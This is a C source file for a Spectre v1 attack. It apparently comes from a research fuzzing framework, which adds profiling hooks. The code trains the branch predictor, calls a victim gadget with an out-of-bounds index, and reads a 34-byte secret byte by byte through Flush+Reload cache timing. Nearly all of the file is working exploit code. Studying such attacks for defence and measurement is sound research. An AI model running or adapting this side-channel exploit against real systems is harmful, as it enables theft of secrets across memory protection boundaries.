#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include "unistd.h"

#include "common.h"

// >>>>> FUZZING PROFILLING variables init START                                  
                                      #include <stdlib.h>     // malloc
                                      #include <stdio.h>      // for printf
                                      #include <stddef.h>     // for uint8_t, size_t etc
                                      #include <stdint.h>
                                      #include <time.h>       // For clock()
                                      #include <string.h>     // For memset
                                      #define ANSI_COLOR_RED     "\x1b[31m"
                                      #define ANSI_COLOR_GREEN   "\x1b[32m"
                                      #define ANSI_COLOR_YELLOW  "\x1b[33m"
                                      #define ANSI_COLOR_BLUE    "\x1b[34m"
                                      #define ANSI_COLOR_RESET   "\x1b[0m"
                                      #define LOGI(s, ...) printf("[" ANSI_COLOR_BLUE "INFO" ANSI_COLOR_RESET " ] " s "\n", ##__VA_ARGS__)
                                      #define LOGW(s, ...) printf("[" ANSI_COLOR_YELLOW "WARNG" ANSI_COLOR_RESET "] " s "\n", ##__VA_ARGS__)
                                      #define LOGE(s, ...) printf("[" ANSI_COLOR_RED "ERROR" ANSI_COLOR_RESET "] " s "\n", ##__VA_ARGS__)
                                      #define LOGD(s, ...) printf("[" ANSI_COLOR_GREEN "DEBUG" ANSI_COLOR_RESET "] " s "\n", ##__VA_ARGS__)
                                      #define LOGI_NNL(s, ...) printf("[" ANSI_COLOR_BLUE "INFO" ANSI_COLOR_RESET " ] " s, ##__VA_ARGS__)		// No New Line
                                      #define LOGW_NNL(s, ...) printf("[" ANSI_COLOR_YELLOW "WARNG" ANSI_COLOR_RESET "] " s, ##__VA_ARGS__)	// No New Line
                                      #define LOGE_NNL(s, ...) printf("[" ANSI_COLOR_RED "ERROR" ANSI_COLOR_RESET "] " s, ##__VA_ARGS__)		// No New Line
                                      #define LOGD_NNL(s, ...) printf("[" ANSI_COLOR_GREEN "DEBUG" ANSI_COLOR_RESET "] " s, ##__VA_ARGS__)	// No New Line
                                      
                                      double total_fuzzing_time_ms = 0;
                                      double total_attack_code_time_ms = 0;
                                      // clock_t local_temp_start = 0;  Always reinit to 0 before using
                                      // clock_t local_temp_end = 0;  Always reinit to 0 before using
                                      // double local_temp_start_minus_end_ms = 0; // Always reinit to 0 before using                                      
// >>>>> FUZZING PROFILLING variables init END


/********************************************************************
Victim functions
********************************************************************/

extern unsigned int array_size;
uint8_t victim_function(size_t x); // Spectre exfiltration gadget
size_t get_offset(); // Returns the offset from the array to the extracted you are supposed to extract

/********************************************************************
Spectre Attacker code
********************************************************************/

#define THRESHOLD 100  /* assume cache hit if time <= threshold ADJUST IF NECCESSARY */
#define MEASUREMENTS 1000
#define SECRET_LENGTH 34

uint8_t usr_array[256 * 512]; /* Used to leak the stolen bytes */

/* Bit magic returning malicious_idx if i%6==0 else returning training_idx */
/* Use this to properly train the branch prediction unit */
size_t get_nxt_idx(int i, size_t training_idx, size_t malicious_idx) {
    size_t x = ((i % 6) - 1) & ~0xFFFF; // 0xFFFF0000 if i%6==0 else 0x00000000 
    x = (x | (x >> 16)); // 0xFFFFFFFF if i%6==0 else 0x00000000
    return training_idx ^ (x & (malicious_idx ^ training_idx));
}

double total_mfence_time_ms = 0;

/* Report best guess in value */
uint8_t stealSecretByte(size_t malicious_x) {
    static int cache_hits[256];

    for (int i = 0; i < 256; i++) {
        cache_hits[i] = 0;
    }
    for (int run = 0; run < MEASUREMENTS; ++run) {
// >>>>> cache_misses fuzz start                                              
// >>>>> cache_misses fuzz end

// >>>>> br_inst_retired fuzz start                                           
// >>>>> br_inst_retired fuzz end

// >>>>> br_misp_retired fuzz start                                                        
// >>>>> br_misp_retired fuzz end

// >>>>> total_inst_retired fuzz start                                  
// >>>>> total_inst_retired fuzz end

        /* FLUSH all cachelines in usr_array */
        for (int i = 0; i < 256; i++)
            flush(&usr_array[i * 512]);

        /* WAIT */
        /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
        size_t training_idx = run % array_size;
        //printf("%d\n",array_size);
        for (int i = 0; i < 30; ++i) {
            flush(&array_size);

            size_t idx = get_nxt_idx(i, training_idx, malicious_x);
            
            /* Call the victim and speculatively load corresponding cacheline in usr_array */
            uint8_t byte = victim_function(idx);
            maccess(&usr_array[byte * 512]);
        }

        /* RELOAD all cachelines in usr_array, time it and increment cache_hits[mixed_i] accordingly */
        for (int i = 0; i < 256; i++) {
            int mixed_i = ((i * 167) + 13) & 255; /* Use this value to access usr_array to prevent stride prediction */
            uint64_t t1 = rdtsc();
            maccess(&usr_array[mixed_i * 512]);
            uint64_t access_time = rdtsc() - t1;
            if (access_time <= THRESHOLD && mixed_i != victim_function(training_idx)) {
                cache_hits[mixed_i]++;
            }
        }
    }

    /* Return byte with most cache hits */
    uint8_t guessed_byte = 0;
    for (int i = 0; i < 256; i++) {
        if (cache_hits[i] >= cache_hits[guessed_byte]) {
            guessed_byte = i;
        }
    }
    return guessed_byte;
}

int main() {
    sleep(2.5);
    /* Store something in usr_array to actually place it in RAM */
    for (int i = 0; i < sizeof(usr_array); i++)
        usr_array[i] = 1;
       // printf("%c\n",&usr_array);
    
    /* Extract the secret byte-wise */
    printf("Stealing %d bytes:\n", SECRET_LENGTH);
    size_t secret_start_idx = get_offset();
    for (int i = 0; i < SECRET_LENGTH; ++i) {
// >>>>> FUZZING total attack code profiling 1 start
                                      clock_t time_for_main_attack_code_start = clock();                                      
// >>>>> FUZZING total attack code profiling 1 end
        uint8_t value = stealSecretByte(secret_start_idx + i);
// >>>>> FUZZING total attack code profiling 2 start
                                      clock_t time_for_main_attack_code_end = clock();
                                      double time_for_main_attack_code_start_minus_end_ms = (double) (time_for_main_attack_code_end - time_for_main_attack_code_start) / CLOCKS_PER_SEC * 1000.0;
                                      total_attack_code_time_ms += time_for_main_attack_code_start_minus_end_ms;                                      
// >>>>> FUZZING total attack code profiling 2 end
        printf("%c", (value > 31 && value < 127 ? value : '?'));
        fflush(stdout);
    }
    printf("\n");

// >>>>> FUZZING total attack code profiling print results start
                                      LOGI("============================== Profilling ==============================");
                                      LOGI("Total fuzzing time (ms)\t\t: %10.4f", total_fuzzing_time_ms);
                                      LOGI("Total attack code time (ms)\t: %10.4f (Including fuzzing time)", total_attack_code_time_ms);
                                      LOGI("Total attack code time (ms)\t: %10.4f (Excluding fuzzing time)", total_attack_code_time_ms - total_fuzzing_time_ms);
                                      LOGI("========================================================================");
                                      printf("For framework:\n%.4f,%.4f,%.4f\n", total_fuzzing_time_ms, total_attack_code_time_ms, total_attack_code_time_ms - total_fuzzing_time_ms);                                      
// >>>>> FUZZING total attack code profiling print results end

    return 0;
}
